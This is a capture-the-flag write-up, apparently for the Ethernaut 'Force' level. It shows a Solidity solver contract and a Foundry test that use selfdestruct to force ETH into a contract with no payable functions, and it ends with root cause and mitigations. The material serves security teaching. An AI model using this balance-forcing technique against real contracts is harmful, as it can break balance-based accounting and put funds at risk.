# 07. Force

[English](07_Force.md) | [한국어](../ko/07_Force.md)

## Objective

Make the empty `Force` contract hold a positive ETH balance.

## Key Concepts

- Forced ETH transfers
- `selfdestruct`
- Contract balances versus payable functions
- Broken balance assumptions
- Cancun-era `selfdestruct` behavior

## Contract Analysis

The target contains no payable constructor, receive function, fallback function, or ordinary function:

```solidity
contract Force {}
```

A direct ETH transfer to this contract would revert because it exposes no payable entry point. However, a contract cannot reliably reject every possible balance increase.

The EVM's `selfdestruct` operation transfers the executing contract's full ETH balance to a beneficiary without calling any function on that beneficiary. The target therefore has no opportunity to accept, reject, or execute code during the transfer.

## Solver Contract

The helper first accepts ETH through its receive function and then names `Force` as the beneficiary of `selfdestruct`:

```solidity
contract ForceSolver {
    function solve(address payable target) external {
        selfdestruct(target);
    }

    receive() external payable {}
}
```

Starting with the Cancun hard fork, `selfdestruct` generally no longer deletes an existing contract's code and storage. It still transfers the contract's ETH balance, so the balance-forcing behavior demonstrated by this level remains relevant.

## Solution Flow

```text
Deploy Force with balance 0
        ↓
Deploy ForceSolver
        ↓
Player sends 0.1 ETH to ForceSolver.receive()
        ↓
ForceSolver balance = 0.1 ETH
        ↓
Call ForceSolver.solve(Force)
        ↓
selfdestruct transfers the full balance without calling Force
        ↓
Force balance = 0.1 ETH
```

## Foundry Test

The test verifies both the initial condition and the exact forced balance:

```solidity
assertEq(address(target).balance, 0);

vm.startPrank(player);
(bool funded,) = payable(solver).call{value: 0.1 ether}("");
assertTrue(funded);

solver.solve(payable(address(target)));
vm.stopPrank();

assertEq(address(target).balance, 0.1 ether);
```

`address(target).balance` reads the account's ETH balance directly. It does not call a function on `Force`.

## Root Cause

The challenge demonstrates an unsafe invariant: assuming a contract's balance can change only through its payable functions. EVM-level balance changes can occur without executing the recipient's code.

In addition to `selfdestruct`, protocol designs should account for ETH assigned through mechanisms such as validator rewards or prefunded deterministic deployment addresses.

## Recommended Mitigations

- Do not use `address(this).balance == expectedAmount` as a critical invariant.
- Track internal accounting separately from the raw account balance.
- Use comparisons that tolerate unsolicited ETH when appropriate.
- Do not assume the absence of payable functions guarantees a zero balance.
- Design withdrawal and settlement logic around recorded obligations rather than the entire raw balance.

## Run the Test

```bash
forge test --match-path test/07_Force.t.sol -vvv
```

To inspect the forced transfer trace:

```bash
forge test --match-path test/07_Force.t.sol -vvvv
```

## Takeaway

A smart contract controls which calls it accepts, but it cannot fully control whether its address receives ETH. Security-critical accounting must not depend on the raw balance changing only through known functions.
